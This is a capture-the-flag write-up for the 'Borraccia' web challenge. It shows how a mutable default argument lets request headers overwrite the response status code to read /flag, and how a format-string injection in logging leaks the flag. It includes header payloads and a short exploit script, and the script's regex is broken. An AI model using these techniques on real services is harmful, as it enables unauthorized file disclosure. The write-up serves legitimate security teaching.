# TeamItaly CTF 2023

## [web] Borraccia (2 solves)

## Overview  
In this challenge we are given an application which uses a custom, poorly-
written web framework, called `Borraccia` (Flask in italian).  
The challenge is tagged as a `misc`, so we probably need to use some Python
shenanigans in order to solve the challenge.

The first thing that catches our attention is something called `ObjDict`,
let's see how it's implemented and what it does:

```python

class ObjDict:  
   def __init__(self, d={}):  
       self.__dict__['_data'] = d # Avoiding Recursion errors on __getitem__

   def __getattr__(self, key):  
       if key in self._data:  
           return self._data[key]  
       return None

   def __contains__(self, key):  
       return key in self._data

   def __setattr__(self, key, value):  
       self._data[key] = value

   def __getitem__(self, key):  
       return self._data[key]

   def __setitem__(self, key, value):  
       self._data[key] = value

   def __delitem__(self, key):  
       del self._data[key]

   def __enter__(self, *args):  
       return self

   def __exit__(self, *args):  
       self.__dict__["_data"].clear()

   def __repr__(self):  
       return f"ObjDict object at <{hex(id(self))}>"

   def __iter__(self):  
       return iter(self._data)

```

Basically, this class works like an object in JavaScript:

```python

obj = ObjDict() # We can also use `with` operator  
obj.first = 10  
obj.second = "20"

print(obj.first) # 10  
print(obj.second) # 20  
print(obj.third) # None

print(obj.secondobj.first) # Error

obj.secondobj = ObjDict()  
obj.secondobj.test = "yay"

print(obj.secondobj.test) # yay

```

At first glance this class would seem fine, but if you know at least the
basics of Python, you can see that this class uses a [mutable object as
default argument](https://florimond.dev/en/posts/2018/08/python-mutable-
defaults-are-the-source-of-all-evil/)!

So, each and every instance of ObjDict shares the same dictionary!  
This will come in handy later...

## Read a file using status codes

We need to read the flag from /flag somehow, so there's probably a path
traversal.

We can see three interesting functions:  
- `serve_file`  
- `serve_static_file`  
- `serve_error`

The first two functions are not used inside `server.py`, so the only function
left is `serve_error`.

Inside `server.py`:

```python  
ctx.response.body = utils.serve_error(ctx.response.status_code)  
```

If we can control the value of `status_code`, we can read arbitrary files.  
But... How?! Isn't `status_code` only modified by the server?

Let's see how the request/response is handled:  
```py  
ctx.response = ObjDict()  
ctx.request = ObjDict()  
  
ctx.response.status_code = 200 # Default value  
```

Oh! Did you see that? `ctx.response` and `ctx.request` shares the same
dictionary!

We can overwrite values thanks to:  
```python  
for probable_header in filter(None, rows[1:]): # Memorizing headers  
   if (cap:=HEADER_RE.search(probable_header)):  
       header = cap.group(1)  
       value = cap.group(2)

       h = utils.normalize_header(header)  
       v = utils.normalize_header_value(value)  
       ctx.request[h] = v   
```

So, if we send a request with `status-code: /flag` the server will send the
flag to us... Right?

Unfortunately no, let's take a look inside `request_handler`:

## Playing with string formatting

```python  
try:  
   utils.build_header(ctx) # Now the response is ready to be sent  
   utils.log(logging,
f"[{curr}]\t{ctx.request.method}\t{ctx.response.status_code}\t{address[0]}",
"DEBUG", ctx)  
   assert ctx.response.status_code in ERRORS or ctx.response.status_code ==
200  
except AssertionError:  
   raise # Something unexpected happened, close conection immediately  
except Exception as e:  
   ctx.response.status_code = 500  
   ctx.response.header = ""  
   ctx.response.body = utils.serve_error(ctx.response.status_code) +
utils.make_comment(f"{e}") # Something went wrong while building the header.  

client.send((ctx.response.header + ctx.response.body).encode())  
```

The flag will be loaded inside ctx.response.body but it will not be sent due
to that `assert`, but if we're able to cause an exception (but not an
AssertionError) with the flag inside, we can receive it.

The first error that came into my mind is, `KeyError`:

```python  
test = {}  
flag = "flag{fake}"  
try:  
   test[flag]  
except KeyError as e:  
   print(e) # 'flag{fake}'  
```

Let's see how `utils.log` is implemented:

```python

def log(log, s, mode="INFO", ctx=None):  
   {  
       "DEBUG": log.debug,  
       "INFO": log.info,  
       "ERROR": log.error  
   }[mode](s.format(ctx), {"mode": mode})

```

Do you see something SUSpicious? Of course you do. We can exploit `s.format`
in order to force logging to cause an exception:

```python  
def log(log, s, mode="INFO", ctx=None):  
   {  
       "DEBUG": log.debug,  
       "INFO": log.info,  
       "ERROR": log.error  
   }[mode](s.format(ctx), {"mode": mode})

try:  
   log(logging, "%(flag{fake_flag})s")  
except Exception as e:  
   print(e) # flag{fake_flag}

```

We can send a similar header in order to get the flag:

```  
status-code: %({0[response][body]})s  
```

But this is not going to work, there's a blacklist:

```python  
@lru_cache  
def normalize_header_value(s: str) -> str:  
   return re.sub(r"[%\"\.\n\'\!:\(\)]", "", s)  
```

So we can't use the following characters: `%".\n'!:()`

Since the blacklist is applied only to headers, we can bypass this by e.g
putting those blacklisted characters inside request.params.

## Exploit

```python  
import re  
import requests

r = requests.get("http://borraccia.challs.teamitaly.eu?a=%(&b=)s",  
           headers={  
                   "status-code": "/flag",  
                   "method": "{0[request][params][a]}{0[response][body]}{0[request][params][b]}"  
           })

print("FLAG:", re.search(r"", r.text).group(1))

```

## Flag

`flag{4Ss3r7_3v3ry7h1nG!1!1!}`

Original writeup
(https://github.com/TeamItaly/TeamItalyCTF-2023/blob/master/Borraccia/README.md).